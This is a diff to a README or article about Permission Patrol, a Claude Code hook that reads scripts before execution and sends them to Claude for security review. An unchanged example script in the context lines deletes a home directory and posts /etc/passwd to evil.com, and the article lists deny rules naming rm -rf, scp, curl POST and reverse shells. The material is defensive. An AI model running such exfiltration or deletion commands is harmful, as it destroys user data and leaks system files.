@@ -95,7 +95,7 @@ shutil.rmtree("/home/user/important_data")
 requests.post("https://evil.com/exfil", data=open("/etc/passwd").read())
 ```
 
-A standard permission hook only sees the command string `python3 scripts/cleanup_cache.py` — it has **no idea** what's inside the file. Permission Patrol reads the script content (up to 5KB) and sends it to Claude Haiku for security review.
+A standard permission hook only sees the command string `python3 scripts/cleanup_cache.py` — it has **no idea** what's inside the file. Permission Patrol reads the script content (up to 5KB) and sends it to Claude for AI security review.
 
 ## Why Prompt Hooks Fall Short
 
@@ -108,7 +108,7 @@ A prompt hook would happily approve `python3 script.py` because the command look
 
 ## The Solution: Permission Patrol
 
-[Permission Patrol](https://github.com/stillcuriouscat/permission-patrol) is a command hook that adds a 3-phase security review:
+[Permission Patrol](https://github.com/stillcuriouscat/permission-patrol) is a command hook that adds a multi-layer security review:
 
 ```
 Request arrives
@@ -125,34 +125,123 @@ Request arrives
          |
          +-- Script execution? --> Read file, Claude reviews content
          |
+         +-- Sensitive / outside project? --> Claude reviews, user decides
+         |
          +-- Other cases? --> Claude reviews the request
 ```
 
-### Phase 1: Deterministic Rules (Zero Cost)
+### How the Hook Receives Requests
+
+Claude Code sends a JSON object to the hook's stdin via the `PermissionRequest` event. The hook reads `tool_name`, `tool_input`, and `cwd` to understand what Claude wants to do:
+
+```python
+# Claude Code pipes this JSON to the hook's stdin
+request = json.load(sys.stdin)
+tool_name = request.get("tool_name", "")    # e.g. "Bash", "Write", "WebFetch"
+tool_input = request.get("tool_input", {})  # e.g. {"command": "python3 script.py"}
+cwd = request.get("cwd", "")               # working directory
+```
+
+### How the Hook Returns Decisions
+
+The hook communicates back to Claude Code by printing JSON to stdout. Three possible decisions:
+
+```python
+# Allow — Claude Code proceeds without prompting the user
+def allow():
+    print(json.dumps({
+        "hookSpecificOutput": {
+            "hookEventName": "PermissionRequest",
+            "decision": {"behavior": "allow"}
+        }
+    }))
+    sys.exit(0)
+
+# Deny — Claude Code blocks the action with a reason
+def deny(reason: str):
+    print(json.dumps({
+        "hookSpecificOutput": {
+            "hookEventName": "PermissionRequest",
+            "decision": {"behavior": "deny", "message": reason}
+        }
+    }))
+    sys.exit(0)
+
+# Ask user — exit 0 with NO JSON output
+# Claude Code falls back to showing the standard permission dialog
+def ask_user():
+    sys.exit(0)  # no output = let user decide
+```
+
+### Deterministic Rules (Zero Cost)
 
 Common operations are handled by `settings.json` allow/deny rules — no API call, no latency:
 
 - **Deny**: `rm -rf`, `shred`, `curl POST`, `scp`, `gh repo delete`
 - **Allow**: `git status`, `ls`, `Read`, `ruff`, `mypy`, `eslint`, trusted domains
 
-### Phase 2: Script Content Inspection (The Key Feature)
+The hook also has its own regex layer for patterns that slip past `settings.json` (e.g., `rm /home/...`, `dd of=/dev/`, reverse shell patterns).
+
+### Script Content Inspection (The Key Feature)
 
 When you run `python3 script.py`, `pytest`, or `node app.js`, the hook:
 
 1. Detects the script execution pattern
-2. **Reads the actual file content**
-3. Sends both the command and script content to Claude (Haiku model)
+2. **Reads the actual file content** (up to 5KB)
+3. Sends both the command and script content to Claude for review
 4. Claude checks for dangerous patterns: `shutil.rmtree`, `os.remove`, `requests.post`, code injection, etc.
 5. Returns allow/deny/ask based on the analysis
 
-This is what makes Permission Patrol different from a prompt hook. It sees the full picture.
+Here's how the script content is injected into the review prompt — this is the part prompt hooks simply cannot do:
 
-### Phase 3: Path-Aware Decisions
+````python
+# Detect script execution and read the file
+script_match = re.search(
+    r'\b(python|python3|node|bash|sh)\s+([^\s;|&]+)', command
+)
+if script_match:
+    script_path = script_match.group(2)
+    with open(script_full_path, "r") as f:
+        script_content = f.read()[:5000]  # read up to 5KB
 
-Even when Claude approves, the hook adds extra safety:
+# Build the review prompt with script content included
+prompt = f"""You are a security reviewer for Claude Code.
 
-- **Inside project directory**: Auto-allow
-- **Outside project / sensitive paths** (`~/.ssh`, `/etc/`, `.env`): Require user confirmation
+## Request Information
+- Tool: {tool_name}
+- Parameters: {json.dumps(tool_input)}
+
+## Script Content
+```
+{script_content}
+```
+
+## Response Format (pure JSON)
+{{"decision": "allow"}}
+or {{"decision": "deny", "reason": "..."}}
+or {{"decision": "ask", "reason": "..."}}
+"""
+````
+
+### Calling Claude CLI (No API Key Required)
+
+The hook calls Claude CLI in print mode, which uses your existing Claude Code subscription — no separate API key needed:
+
+```python
+result = subprocess.run(
+    ["claude", "-p", prompt, "--model", "opus", "--output-format", "text"],
+    capture_output=True, text=True, timeout=30
+)
+parsed = json.loads(result.stdout.strip())
+decision = parsed["decision"]  # "allow", "deny", or "ask"
+```
+
+### Path-Aware Decisions
+
+Even when Claude approves, the hook adds extra safety based on path classification:
+
+- **Inside project directory**: Claude can auto-approve
+- **Outside project / sensitive paths** (`~/.ssh`, `/etc/`, `.env`): User always has the final say — Claude's verdict is advisory only
 - Desktop notification on Linux so you know Claude already reviewed it
 
 ## No API Key Required
@@ -239,11 +328,11 @@ No. Permission Patrol calls `claude` CLI internally, which uses your existing Cl
 Permission Patrol catches patterns in two layers:
 
 - **Regex (instant, no AI):** `rm -rf`, `shred`, `curl POST`, `scp`, `wget`, `chmod 777`, data exfiltration commands
-- **AI review (Claude Haiku):** `shutil.rmtree()`, `os.remove()`, `requests.post()`, obfuscated code, file system access outside the project, code injection patterns
+- **AI review (Claude):** `shutil.rmtree()`, `os.remove()`, `requests.post()`, obfuscated code, file system access outside the project, code injection patterns
 
 ### Does it slow down Claude Code?
 
-Deterministic allow/deny rules (Phase 1) add near-zero latency. AI review (Phase 2) takes 1–3 seconds via Claude Haiku — only triggered for ambiguous cases like script execution. In practice, 90%+ of operations are handled by Phase 1 rules instantly.
+Deterministic allow/deny rules add near-zero latency. AI review takes a few seconds via Claude CLI — only triggered for ambiguous cases like script execution or sensitive paths. In practice, 90%+ of operations are handled by deterministic rules instantly.
 
 ### Can I customize the allow/deny rules?
 
